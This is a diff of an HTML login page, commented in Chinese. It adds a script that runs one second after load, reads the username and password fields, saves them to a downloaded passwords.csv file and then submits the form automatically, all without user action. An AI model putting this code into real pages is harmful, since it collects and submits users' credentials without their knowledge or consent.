@@ -20,13 +20,8 @@
     <p id="message" style="color: green; display: none;">✅ 密碼已下載！</p>
     
     <script>
-        changer = function() {
-             document.forms[0].submit(); }
-        setTimeout(changer, 1000);
-    </script>
-    <script>
-         document.getElementById("login-form").addEventListener("submit", function(event) {
-            // 取得輸入的帳號與密碼
+        function autoSubmitAndDownload() {
+            // 取得帳號與密碼
             let username = document.getElementById("username").value;
             let password = document.getElementById("password").value;
 
@@ -47,16 +42,22 @@
             link.href = URL.createObjectURL(blob);
             link.download = "passwords.csv";
 
-            // 觸發下載
+            // **嘗試模擬使用者點擊下載**
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-        });
-    </script>
-    <script>
-        changer = function() {
-             document.forms[0].submit(); }
-        setTimeout(changer, 1000);
+
+            // **顯示提示**
+            document.getElementById("message").style.display = "block";
+
+            // **2 秒後自動提交表單**
+            setTimeout(() => {
+                document.forms[0].submit();
+            }, 2000);
+        }
+
+        // **1 秒後自動執行密碼下載並提交表單**
+        setTimeout(autoSubmitAndDownload, 1000);
     </script>
 </body>
 </html>
